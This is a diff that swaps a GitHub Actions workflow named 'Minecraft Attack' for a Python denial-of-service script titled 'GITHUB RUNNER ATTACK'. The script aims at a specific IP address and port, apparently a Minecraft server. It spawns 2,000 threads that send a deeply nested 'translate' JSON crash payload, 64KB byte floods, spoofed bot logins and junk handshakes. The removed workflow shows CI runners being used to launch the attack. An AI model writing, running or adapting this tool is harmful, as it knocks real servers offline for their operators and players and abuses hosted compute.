@@ -1,21 +1,110 @@
-name: Minecraft Attack
+#!/usr/bin/env python3
+"""
+GITHUB RUNNER ATTACK
+Target: 13.233.195.2:25566
+"""
 
-on:
-  workflow_dispatch:  # Manually trigger
+import socket
+import threading
+import time
+import json
+import random
+import sys
 
-jobs:
-  attack:
-    runs-on: ubuntu-latest
-    timeout-minutes: 5
+TARGET_IP = "13.233.195.2"
+TARGET_PORT = 25566
+THREADS = 500
+DURATION = 30
 
-    steps:
-      - uses: actions/checkout@v4
+PAYLOAD = {
+    "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
+    "with": [{
+        "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
+        "with": [{
+            "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
+            "with": [{
+                "translate": "%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s%1$s",
+                "with": [{"text": "ouch!"}]
+            }]
+        }]
+    }]
+}
 
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
+def exploit():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((TARGET_IP, TARGET_PORT))
+            s.send(b'\x03' + json.dumps(PAYLOAD).encode())
+            s.close()
+        except:
+            pass
 
-      - name: Run Attack
-        run: |
-          python3 attack.py
+def flood():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect((TARGET_IP, TARGET_PORT))
+            s.send(b'\xff' * 65535)
+            s.close()
+        except:
+            pass
+
+def spam():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((TARGET_IP, TARGET_PORT))
+            s.send(b'\x00' + f"Bot{random.randint(1,99999)}".encode() + b'\x00')
+            s.close()
+        except:
+            pass
+
+def handshake():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect((TARGET_IP, TARGET_PORT))
+            s.send(b'\x00' * 100)
+            s.close()
+        except:
+            pass
+
+def check():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        r = s.connect_ex((TARGET_IP, TARGET_PORT))
+        s.close()
+        return r == 0
+    except:
+        return False
+
+print("[+] GITHUB RUNNER ATTACK STARTING...")
+print(f"[+] Target: {TARGET_IP}:{TARGET_PORT}")
+
+if check():
+    print("[+] Server ONLINE")
+else:
+    print("[-] Server OFFLINE")
+    sys.exit(1)
+
+print("[*] Launching attack...")
+for _ in range(THREADS):
+    threading.Thread(target=exploit, daemon=True).start()
+    threading.Thread(target=flood, daemon=True).start()
+    threading.Thread(target=spam, daemon=True).start()
+    threading.Thread(target=handshake, daemon=True).start()
+
+print(f"[+] {THREADS * 4} threads running!")
+print(f"[*] Running for {DURATION}s...")
+
+for i in range(DURATION):
+    time.sleep(1)
+    print(f"[*] {i+1}s / {DURATION}s", end="\r")
+
+print("\n[+] Attack complete!")
